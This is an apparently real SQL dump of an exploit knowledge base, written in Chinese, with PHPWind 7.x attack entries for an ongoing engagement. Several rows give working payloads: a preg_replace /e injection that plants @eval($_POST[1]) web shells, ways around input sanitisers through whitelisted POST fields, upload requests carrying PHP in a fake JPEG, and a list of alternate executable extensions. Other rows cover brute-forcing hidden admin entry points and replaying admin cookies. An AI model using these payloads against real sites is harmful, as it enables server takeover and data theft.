239:     }
240: }
241: unset($u,$a,$cookie_userads);   // ← 无论走哪个分支都执行，$a 被删

// 其它 InitGP(array(''a'',...)) 的位置（均属 apps/ 路由，不与 bank_sort.php 同作用域）：
// apps/ajax/example.com:6  apps/article/example.com:12  apps/photos/example.com:14
// apps/diary/example.com:14  apps/groups/action/m_groups.php:17  m_group.php:9
// apps/groups/action/m_galbum.php:12  apps/share/action/m_share.php:11
// 全站没有任何 InitGP 装载 ''_''  → ${@eval($_)} 必死',NULL,0,'7.5 SP3 源码判定为“取不到值”。目标 7.3.2 的 global.php 该段（用户广告功能）是否存在/是否有 unset 未验证，需发上述 1 包判定。',0,NULL,NULL,NULL,NULL,NULL,'phpwind,InitGP,register_globals,变量注入,死payload判据','exploit','2026-10-06T11:37:16.166Z','2026-10-06T11:37:16.166Z');
INSERT INTO poc (id,code,title,kind,category,cve,component,versions,severity,language,source,source_url,description,usage,content,path,verified,verified_note,hit_count,used_on,engagement_id,engagement_name,asset_target,found_by_agent,tags,created_by,created_at,updated_at) VALUES (202,'phpwind-7.x-eis-注入点-copyctrl-read-colour-需-pw_threads.colour-列存在','PHPWind 7.x /eis 注入点：copyctrl(''$read[colour]'') —— 需 pw_threads.colour 列存在','poc','rce',NULL,'PHPWind 7.x require/template.php + lib/staticpage.class.php',NULL,'critical','php','self',NULL,'require/target191.example.com:345 与 lib/target192.example.com:409 使用 preg_replace 的 /eis 修饰符，替换串为双引号字符串 "copyctrl(''$read[colour]'')" —— 变量被插值后作为 PHP 代码 eval。colour 来自 SELECT t.* FROM pw_threads，即 pw_threads.colour 列。触发还需版块设置 copyctrl（后台 target193.example.com:459 ''copyctrl'' 字段）为真。判据：7.5 SP3 的 pw_threads 建表语句（lang/install_wind.sql:3383-3423）无 colour 列，且全代码库只有读 colour、没有写 colour 的位置，故 7.5 上是死代码；8.7 仍保留同一行（8.7 require/target191.example.com:352），官方从未修写法本身。7.3.2 未验证。','前置：① 某版块 forumset 里 copyctrl=1；② pw_threads.colour 列存在（7.3.2 待确认）。
0 包判定 colour 列是否存在（纯前端观察）：
  GET /bbs/post.php?fid=<可发帖版块>
  查看发帖页面 HTML 里是否有“标题颜色/字体颜色”选择控件（name 含 colour/color 的 select 或 input）。
  有 → 该版本有标题颜色功能，colour 可写，本利用成立。
利用（3 个包）：
  1) POST /bbs/post.php?fid=<fid>&step=2（或 PW 的发表流程）
     subject=test&atc_content=aaa<br>bbb&colour=a'') , @eval($_POST[1]), (''b（注意 colour 字段名以实际观测量为准）
  2) 浏览生成的静态页：GET /bbs/read.php?tid=<tid> 或直接 GET /bbs/htm_data/<fid>/<ym>/<tid>.html
     该请求会走 require/template.php 的 htmread 分支 → 静态化 → 触发 /e
  3) 同时 POST 1=<PHP 代码>
  期待回显：phpinfo 内容或命令输出出现在静态页内容中。','// require/target191.example.com:345 （htmread 内，帖子静态页生成路径）
$GLOBALS[''foruminfo''][''copyctrl''] && $read[''content''] = preg_replace("/<br>/eis","copyctrl(''$read[colour]'')",$read[''content'']);

// lib/target192.example.com:409 （版块静态页生成路径，同一写法）
$this->forum->foruminfo[''copyctrl''] && $read[''content''] = preg_replace("/<br>/eis","copyctrl(''$read[colour]'')",$read[''content'']);

// 8.7 完全保留：require/target191.example.com:352、lib/target192.example.com:355
// 说明官方 8.7 未修此写法。

// 反证：pw_threads 建表语句（lang/install_wind.sql:3383-3423）逐列核对，无 colour 列：
// tid fid icon titlefont author authorid subject toolinfo toolfield ifcheck type
// postdate lastpost lastposter hits replies favors modelid shares topped topreplays
// locked digest special state ifupload ifmail ifmark ifshield anonymous dig fight
// ptable ifmagic ifhide inspect tpcstatus
// 全代码库 grep ''colour'' 仅 3 处命中，全部是“读”，没有任何写入 pw_threads.colour 的代码
// → 7.5 SP3 / 8.7 上 $read[''colour''] 恒为空，此 /e 为死代码。
// → 但 7.3.2 属更早版本，若老库 pw_threads 保留 colour 列且前台发帖曾支持“标题颜色”
//   （profile/post 模板里会有颜色选择器），则该 /e 立刻复活。

// 注入原理（若 colour 可控）：
//   colour = ''){@eval($_POST[1])}//
//   替换串先被 PHP 双引号插值 → copyctrl(''){@eval($_POST[1])}//'')
//   再被 /e 当 PHP 代码 eval → 执行 { @eval($_POST[1]) }
// 另一个通用短 payload（不需要引号收尾，因为 colour 一般未做引号过滤）：
//   colour = a'') , @eval($_POST[1]), (''b
//   插入后：copyctrl(''a'') , @eval($_POST[1]), (''b'')  → 完整表达式，eval 执行',NULL,0,'7.5 SP3 源码判定 colour 列不存在（建表语句逐列核对 + 全库 grep 无写入点）。7.3.2 待实测：需 1 个 GET 看发帖页是否有颜色选择器。',0,NULL,NULL,NULL,NULL,NULL,'phpwind,preg_replace,/e,复制控制,copyctrl,静态化','exploit','2026-10-06T11:37:28.998Z','2026-10-06T11:37:28.998Z');
INSERT INTO poc (id,code,title,kind,category,cve,component,versions,severity,language,source,source_url,description,usage,content,path,verified,verified_note,hit_count,used_on,engagement_id,engagement_name,asset_target,found_by_agent,tags,created_by,created_at,updated_at) VALUES (203,'phpwind-7.x-入参清洗边界与-5-个-post-豁免字段-payload-构造必须遵守','PHPWind 7.x 入参清洗边界与 5 个 POST 豁免字段（payload 构造必须遵守）','script','app-audit',NULL,'PHPWind 7.x global.php / require/common.php',NULL,'high','php','self',NULL,'PHPWind 7.x 全局入参清洗的真实边界，直接决定 payload 怎么写。target116.example.com:53-61 对 $_POST 逐键调用 CheckVar，但 atc_content / atc_title / prosign / pwuser / pwpwd 这 5 个键名被显式豁免；$_GET 则无豁免全量清洗。CheckVar（require/target105.example.com:667-679）把 ) → &#41;、= → &#61;、< → &#60;、.. → &#46;&#46;，左括号 ( 不转义。Char_cv（646-666）把 " '' < > 转成 HTML 实体并折叠制表符/双空格。结论：payload 里不能出现右括号与等号，除非把内容放进上述 5 个 POST 白名单字段；$ { } ( [ ] ; . / : _ @ 全部可通过。','构造任何 PHP payload 时：
1) 优先避开右括号：用 include$_POST[0]; / echo 1; / eval($_POST[1]); 这类不需要 ) 的写法（include 不带括号合法）。
2) 必须带括号时，把代码体放进 POST 的 atc_content / atc_title / prosign / pwuser / pwpwd 之一。
   例：
     GET  /bbs/<任意写入点>&a=eval($_POST[atc_content]);
     POST atc_content=phpinfo();        ← 这一层不会再被 CheckVar，括号保留
   注意此时 a 的值里带 ) 会被转义 → 应改为 eval($_POST[pwuser]) 仍带 ) 不行；
   实际可行版：GET 参数 a 只放无括号骨架，代码体走白名单字段。
3) 字符串常量避免引号：'' 与 " 都会被实体化，改用 heredoc 不可行 → 用 $_POST[x] 传字符串。','// target116.example.com:53-61  —— 所有前台请求必经
foreach ($_POST as $_key => $_value) {
	if (!in_array($_key,array(''atc_content'',''atc_title'',''prosign'',''pwuser'',''pwpwd''))) {
		CheckVar($_POST[$_key]);
	}
}
foreach ($_GET as $_key => $_value) {
	CheckVar($_GET[$_key]);        // GET 无豁免，全量
}

// require/target105.example.com:667-679
function CheckVar(&$var) {
	if (is_array($var)) {
		foreach ($var as $key => $value) { CheckVar($var[$key]); }
	} elseif (P_W != ''admincp'') {
		$var = str_replace(array(''..'','')'',''<'',''=''),array(''&#46;&#46;'',''&#41;'',''&#60;'',''&#61;''),$var);
	} elseif (str_replace(array(''<iframe'',''<meta'',''<script''),'''',$var)!=$var) {
		global $basename; $basename = ''javascript:history.go(-1);''; adminmsg(''word_error'');
	}
}
// 注意：只转义右括号 ) 与 = < ..，左括号 ( 保留。

// require/target105.example.com:646-666  Char_cv（InitGP 默认 cvtype=1 会调用）
''"''    → &quot;
"''"    → &#39;
"<"    → &lt;      ("%3C" 同样)
">"    → &gt;      ("%3E" 同样)
"\t"   → 4 空格 ; 连续两个空格 → &nbsp;&nbsp;
去掉 \0 %00 \r 与控制字符；$istrim=true 时先 trim
// 保留：$ { } ( [ ] ; . / : _ @ 以及全部 ASCII 字母数字

// target116.example.com:40-51 URL 重写模式（$_GET = $_NGET）发生在 CheckVar 之前，
// 所以重写出来的参数同样会被 CheckVar 处理，无法借此绕过。',NULL,0,'源码逐行确认（7.5 SP3）。该结论对 7.3.2 的适用性需以目标实际响应验证（7.3.2 的 global.php 是否已有同段 CheckVar 未知）。',0,NULL,NULL,NULL,NULL,NULL,'phpwind,参数清洗,CheckVar,Char_cv,payload构造约束','exploit','2026-10-06T11:37:29.041Z','2026-10-22 16:52:37');
INSERT INTO poc (id,code,title,kind,category,cve,component,versions,severity,language,source,source_url,description,usage,content,path,verified,verified_note,hit_count,used_on,engagement_id,engagement_name,asset_target,found_by_agent,tags,created_by,created_at,updated_at) VALUES (204,'phpwind-uploadicon-头像上传在-7.5-sp3-的校验实现-7.3.2-需实测是否有白名单','PHPWind uploadicon 头像上传在 7.5 SP3 的校验实现（7.3.2 需实测是否有白名单）','poc','file-upload',NULL,'PHPWind example.com / lib/upload.class.php',NULL,'high','php','self',NULL,'知识库 id=75 声称 example.com?action=uploadicon 可任意文件写入，在 7.5 SP3 上已被两道校验堵住：① example.com:261 扩展名白名单 in_array($ext, array(''gif'',''jpg'',''jpeg'',''png'',''bmp''))，ext 取自 $_GET[''filename'']；② example.com:282 GetImgSize($middleFile,''jpg'') 内容校验，失败即 P_unlink 删除。落盘文件名由 {$winduid}.{ext} / m_{uid}.jpg / s_{uid}.jpg 拼成，uid 为数字，扩展名被白名单锁死，无法落到 .php。另 lib/target52.example.com:152 的 postupload() 只拦 ''..''、''.php.'' 与 eregi 的 ''.php$''，未拦 .pht/.php5/.php3 等备用后缀。7.3.2 属更早版本，是否已有这两道校验未知——这是本条待验证的核心。','判定目标 7.3.2 是否有扩展名白名单（低风险，2 个包）：
1) 先登录取 cookie，再把 1x1 合法 jpg 传到 source 路径：
   POST /bbs/example.com?action=uploadicon&uid=<uid>&verify=<swfhash>
   Content-Type: multipart/form-data; ...（字段名 atc_attachment_1 之类，以 faceupload.class.php 的 allowType 为准）
2) 再试非图片扩展名：
   POST /bbs/example.com?action=uploadicon&step=2&filename=x.php HTTP/1.1
   Content-Type: application/octet-stream
   <RAW: \xFF\xD8\xFF + <?php ...;?>>
判定：
   返回 undefined_action → 白名单存在（7.5 行为，此路不通）
   返回 URL / 无 undefined_action 且 upload/<uid后2位>/{uid}.php 可 GET 到 → 7.3.2 无白名单，RCE 成立
注意：即使白名单存在，也可尝试 .pht/.php5/.phtml（postupload 未拦），取决于宝塔 nginx 是否把它们交给 PHP-FPM。','// example.com:238-315 —— action=uploadicon（7.5 SP3）
} elseif ($action == ''uploadicon'') {
	if (empty($_GET[''step''])) {
		// 路径 1：走 FaceUpload 行为类 + PwUpload::upload()
		list($db_upload,$db_imglen,$db_imgwidth,$db_imgsize) = explode("\t",$db_upload);
		InitGP(array(''uid'',''verify''));
		$swfhash = GetVerify($uid);
		checkVerify(''swfhash'');
		require_once(R_P . ''lib/upload/faceupload.class.php'');
		$face = new FaceUpload($uid);
		PwUpload::upload($face);
	} else {
		// 路径 2：raw POST 写入
		$ext = strtolower(substr(strrchr($_GET[''filename''],''.''),1));      // ← 扩展名来自 GET filename
		$udir = str_pad(substr($winduid,-2),2,''0'',STR_PAD_LEFT);
		$source = PwUpload::savePath(0, "{$winduid}_tmp.$ext", "upload/$udir/");
261:		if (!in_array(strtolower($ext), array(''gif'',''jpg'',''jpeg'',''png'',''bmp'')) || !file_exists($source)) {
		    Showmsg(''undefined_action'');                                   // ← 7.5 的扩展名白名单
		}
264:		$data = $_SERVER[''HTTP_RAW_POST_DATA''] ? $_SERVER[''HTTP_RAW_POST_DATA''] : file_get_contents(''php://input'');
266:		if ($data) {
271:			$filename  = "{$winduid}.jpg";
277:			$middleFile = PwUpload::savePath($db_ifftp, $filename, "$middleDir", ''m_'');
279:			writeover($middleFile, $data);              // ← 任意 RAW 内容先落盘
282:			if (!$img_size = GetImgSize($middleFile,''jpg'')) {
283:				P_unlink($middleFile); Showmsg(''upload_content_error'');  // ← 7.5 的内容校验
			}
287:			$normalFile = PwUpload::savePath($db_ifftp, "{$winduid}.$ext", "$normalDir");
292:			} elseif (!PwUpload::movefile($source, $normalFile)) { Showmsg(''undefined_action''); }
297:			$smallFile = PwUpload::savePath($db_ifftp, $filename, "$smallDir", ''s_'');
		}
	}
}

// lib/target52.example.com:151-170
function postupload($tmp_name,$filename) {
152:	if (strpos($filename,''..'') !== false || strpos($filename,''.php.'') !== false || eregi("\.php$",$filename)) {
		exit(''illegal file type!'');        // ← 只堵 .. / .php. / .php$（eregi 忽略大小写）
	}
	PwUpload::createFolder(dirname($filename));
	if (function_exists("move_uploaded_file") && @move_uploaded_file($tmp_name,$filename)) { @chmod($filename,0777); return true; }
	elseif (@copy($tmp_name, $filename)) { @chmod($filename,0777); return true; }
	elseif (is_readable($tmp_name)) { writeover($filename,readover($tmp_name)); if (file_exists($filename)) { @chmod($filename,0777); return true; } }
	return false;
}
// 未拦截的备用后缀：pht / phtml / php3 / php4 / php5 / php7 / phps / inc（是否被 nginx 当 PHP 执行取决于宝塔站点配置）

// lib/target52.example.com:31-38 扩展名与体积校验
if (empty($upload[''ext'']) || !isset($bhv->ftype[$upload[''ext'']])) { uploadmsg(''upload_type_error''); }
if ($upload[''size''] < 1 || $upload[''size''] > $bhv->ftype[$upload[''ext'']]*1024) { ... uploadmsg(...); }',NULL,0,'7.5 SP3 源码确认已加扩展名白名单 + GetImgSize 内容校验。目标 7.3.2 未验证（知识库 id=75 可能记录的就是 7.3.2 的行为）。',10,NULL,NULL,NULL,NULL,NULL,'phpwind,uploadicon,头像上传,任意文件写入,7.5已加校验','exploit','2026-10-06T11:37:44.119Z','2026-10-19T10:00:52.933Z');
INSERT INTO poc (id,code,title,kind,category,cve,component,versions,severity,language,source,source_url,description,usage,content,path,verified,verified_note,hit_count,used_on,engagement_id,engagement_name,asset_target,found_by_agent,tags,created_by,created_at,updated_at) VALUES (205,'phpwind-7.x-后台入口机制-admin_file-php_self-全站唯一入口-example.com-install.php-存在则后台拒绝进入','PHPWind 7.x 后台入口机制：$admin_file = PHP_SELF，全站唯一入口 example.com，install.php 存在则后台拒绝进入','script','app-audit',NULL,'PHPWind 7.x example.com / admin/example.com',NULL,'medium','php','self',NULL,'后台入口机制源码级结论。admin/example.com:44 $admin_file = $pwServer[''PHP_SELF''] —— 后台入口文件名的唯一来源就是“你访问的那个文件名”，不存在于 pw_config 或任何配置项，所以站长把 example.com 改名即可隐藏后台，恢复入口只能靠目录爆破找文件名。example.com:58 用 $adminjob 拼 admin/<name>.php 并 require，example.com:30 已拦 ''..''。全代码库只有 example.com 一个文件 require example.com，admin/example.com 直接访问返回的 9 字节 readover 守卫即来自 example.com:9。另 example.com:42 存在 file_exists(''install.php'') && adminmsg(''installfile_exists'')，即根目录只要还有 install.php，后台入口即使找到也无法进入。','1) 后台入口名只能靠文件名爆破（不存在配置项可读）：
   字典思路：admin / admincp / manage / manager / master / houtai / guanli / admin_<随机> / <站长惯用拼音>
   探测特征：GET /bbs/<name>.php → 302/200 且响应含 PHPWind 后台登录表单或 adminmsg 提示；
   错误入口返回 404 或站点 404 页。
   注意：GET /bbs/example.com 若返回 404 说明已改名；若返回后台登录页说明未改。
2) 找到入口后先确认能不能进：
   GET /bbs/<name>.php?adminjob=admin
   若响应为 installfile_exists 提示 → install.php 还在根目录，任何后台账号都进不去（example.com:42）。
3) 若已知创始人账号口令，可用浏览器登录：认证是 Cookie AdminUser = StrCode("用户名\t密码hash\tuid...")，
   SafeCheck 有效期 1800 秒，且与 User-Agent 绑定（target105.example.com:243 PwdCode 用 HTTP_USER_AGENT）。
   → 用脚本重放时必须保持 UA 一致，否则 Cookie 立即失效。
4) 若能拿到管理员（if_manager）账号，managerRight 列表里的模块是最高权限集合：
   rightset manager ystats diyoption optimize modepage sphinx app ajaxhandler
   —— 这些模块里的 updatecache_conf / setstyles 等就是后台写码点。','// example.com:1-61（后台唯一入口）
12: define(''R_P'',strpos(__FILE__,DIRECTORY_SEPARATOR)!==FALSE ? substr(__FILE__,0,strrpos(__FILE__,DIRECTORY_SEPARATOR)).''/'' : ''./'');
13: define(''D_P'',R_P);
14: require_once(R_P.''admin/example.com'');        // ← example.com:9 !defined(''R_P'') && exit(''Forbidden'')
15: $basename = $admin_file.''?adminjob=''.$adminjob;
16: if (!$adminjob) { require_once(R_P.''admin/example.com''); }
18: elseif($adminjob == ''notice''){ require_once(R_P.''admin/notice.php''); }   // 计划任务进程
57: } elseif (managerRight($adminjob) || adminRight($adminjob,$admintype)) {
58:     require_once Pcv(R_P.''admin/''.$adminjob.''.php'');   // ← 任意后台模块调度
59: } else { adminmsg(''undefine_action''); }
64: function managerRight($adminjob) { return If_manager && in_array($adminjob,array(''rightset'',''manager'',''ystats'',''diyoption'',''optimize'',''modepage'',''sphinx'',''app'',''ajaxhandler'')); }

// admin/example.com 关键行
9:  !defined(''R_P'') && exit(''Forbidden'');       // ← 直接访问 admin/example.com 只输出这 9 字节
14: require_once(R_P.''require/common.php'');
15: pwInitGlobals();
28: InitGP(array(''adminjob'',''admintype'',''type'',''hackset'',''a_type'',''action'',''verify'',''adskin'',''job'',''ajax'',''admin_keyword''));
30: if (strpos($adminjob,''..'') !== false || $admintype && strpos($admintype,''..'') !== false) { exit(''Forbidden''); }   // ← 堵目录穿越
42: file_exists(''install.php'') && adminmsg(''installfile_exists'');   // ← ★ 根目录存在 install.php 就拒绝进后台
44: $admin_file = $pwServer[''PHP_SELF''];         // ← ★ 后台入口名 = 当前访问的文件名，不存在任何配置项
47: if ($adminjob == ''quit'') { Cookie(''AdminUser'','''',0); ObHeader($admin_file); }
132: $AdminUser = GetCookie(''AdminUser'');        // 认证完全基于 Cookie AdminUser（StrCode 异或 + UA + db_hash）
245-255: SafeCheck() / PwdCode() = md5(HTTP_USER_AGENT . $pwd . $db_hash)

// 全代码库 grep ''example.com'' 的 require/include 结果：只有 example.com:14 一处。
// → example.com 被改名后，没有第二个文件能进后台。
// admin/modestamp.php、admin/cache.php、admin/upgrade.php 都不是独立入口：
//   admin/cache.php:2  !function_exists(''writeover'') && exit(''Forbidden'');   // 纯函数库，无参数调度，末尾无 adminjob 分支
//   admin/upgrade.php 是 $adminjob 模块之一（example.com?adminjob=upgrade），根目录无 upgrade.php
